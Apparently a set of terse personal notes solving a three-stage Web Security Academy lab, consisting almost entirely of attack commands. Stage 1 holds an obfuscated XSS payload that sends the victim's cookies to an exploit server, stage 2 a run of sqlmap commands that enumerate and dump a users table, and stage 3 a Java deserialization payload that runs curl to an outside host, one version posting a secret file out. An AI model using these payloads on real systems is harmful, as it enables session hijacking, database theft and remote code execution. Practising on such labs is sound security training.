stage 1

fetch("https://exploit-0a9b009e04a8929682d05f8e015100d4.exploit-server.net/?c="+btoa(document['cookie'])) base64-ezve:
ZmV0Y2goImh0dHBzOi8vZXhwbG9pdC0wYTliMDA5ZTA0YTg5Mjk2ODJkMDVmOGUwMTUxMDBkNC5leHBsb2l0LXNlcnZlci5uZXQvP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp

"+eval(atob("ZmV0Y2goImh0dHBzOi8vZXhwbG9pdC0wYTliMDA5ZTA0YTg5Mjk2ODJkMDVmOGUwMTUxMDBkNC5leHBsb2l0LXNlcnZlci5uZXQvP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp"))}//

<script>
location = "https://0a9700a504d29218829f608d009f0069.web-security-academy.net/?SearchTerm=%22%2Beval%28atob%28%22ZmV0Y2goImh0dHBzOi8vZXhwbG9pdC0wYTliMDA5ZTA0YTg5Mjk2ODJkMDVmOGUwMTUxMDBkNC5leHBsb2l0LXNlcnZlci5uZXQvP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp%22%29%29%7D%2F%2F"
</script>

stage 2

python3 sqlmap.py -u 'https://0a9700a504d29218829f608d009f0069.web-security-academy.net/advanced_search?SearchTerm=aa&organize_by=DATE&blogArtist=' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' -H 'Cookie: session=04P1Odvmp3d1T8mdjAzzIZJ3nP4kMixh; _lab=46%7cMCwCFCLZehc2VF7%2bRvCbZ%2bcKMC9QCZfQAhRDw0gIZFU9v9aEKv1aJ06rIIpK5gNbPA5Wt3tY5li%2fYJzEk%2fUOaKgqPHUkRyEIQ%2fADl3nxUwZpz3GLf1uQDSCs19S94%2bW1vQRnUx0l2EbZLoBBleUUzZ6BweUxhoUXIz3IS7wdYs8LW%2f0%3d' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-User: ?1' -H 'TE: trailers' -p 'organize_by' -batch


python3 sqlmap.py -u 'https://0a9700a504d29218829f608d009f0069.web-security-academy.net/advanced_search?SearchTerm=aa&organize_by=DATE&blogArtist=' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' -H 'Cookie: session=04P1Odvmp3d1T8mdjAzzIZJ3nP4kMixh; _lab=46%7cMCwCFCLZehc2VF7%2bRvCbZ%2bcKMC9QCZfQAhRDw0gIZFU9v9aEKv1aJ06rIIpK5gNbPA5Wt3tY5li%2fYJzEk%2fUOaKgqPHUkRyEIQ%2fADl3nxUwZpz3GLf1uQDSCs19S94%2bW1vQRnUx0l2EbZLoBBleUUzZ6BweUxhoUXIz3IS7wdYs8LW%2f0%3d' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-User: ?1' -H 'TE: trailers' -p 'organize_by' -batch --flush-session --dbms postgresql --technique E --level 5


python3 sqlmap.py -u 'https://0a9700a504d29218829f608d009f0069.web-security-academy.net/advanced_search?SearchTerm=aa&organize_by=DATE&blogArtist=' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' -H 'Cookie: session=04P1Odvmp3d1T8mdjAzzIZJ3nP4kMixh; _lab=46%7cMCwCFCLZehc2VF7%2bRvCbZ%2bcKMC9QCZfQAhRDw0gIZFU9v9aEKv1aJ06rIIpK5gNbPA5Wt3tY5li%2fYJzEk%2fUOaKgqPHUkRyEIQ%2fADl3nxUwZpz3GLf1uQDSCs19S94%2bW1vQRnUx0l2EbZLoBBleUUzZ6BweUxhoUXIz3IS7wdYs8LW%2f0%3d' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-User: ?1' -H 'TE: trailers' -p 'organize_by' -batch --flush-session --dbms postgresql --technique E --level 5 --dbs


python3 sqlmap.py -u 'https://0a9700a504d29218829f608d009f0069.web-security-academy.net/advanced_search?SearchTerm=aa&organize_by=DATE&blogArtist=' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' -H 'Cookie: session=04P1Odvmp3d1T8mdjAzzIZJ3nP4kMixh; _lab=46%7cMCwCFCLZehc2VF7%2bRvCbZ%2bcKMC9QCZfQAhRDw0gIZFU9v9aEKv1aJ06rIIpK5gNbPA5Wt3tY5li%2fYJzEk%2fUOaKgqPHUkRyEIQ%2fADl3nxUwZpz3GLf1uQDSCs19S94%2bW1vQRnUx0l2EbZLoBBleUUzZ6BweUxhoUXIz3IS7wdYs8LW%2f0%3d' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-User: ?1' -H 'TE: trailers' -p 'organize_by' -batch --flush-session --dbms postgresql --technique E --level 5 -D public --tables

python3 sqlmap.py -u 'https://0a9700a504d29218829f608d009f0069.web-security-academy.net/advanced_search?SearchTerm=aa&organize_by=DATE&blogArtist=' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' -H 'Cookie: session=04P1Odvmp3d1T8mdjAzzIZJ3nP4kMixh; _lab=46%7cMCwCFCLZehc2VF7%2bRvCbZ%2bcKMC9QCZfQAhRDw0gIZFU9v9aEKv1aJ06rIIpK5gNbPA5Wt3tY5li%2fYJzEk%2fUOaKgqPHUkRyEIQ%2fADl3nxUwZpz3GLf1uQDSCs19S94%2bW1vQRnUx0l2EbZLoBBleUUzZ6BweUxhoUXIz3IS7wdYs8LW%2f0%3d' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-User: ?1' -H 'TE: trailers' -p 'organize_by' -batch --flush-session --dbms postgresql --technique E --level 5 -D public -T users --dump


stage 3

Compress using gzip
Encode using Base64
Encode using URL encoding

CommonsCollections7 'curl https://547ky7x77s0wgog2b0hozp6bb2ht5l29r.oastify.com'

CommonsCollections7 'curl https://547ky7x77s0wgog2b0hozp6bb2ht5l29r.oastify.com -d @/home/carlos/secret'
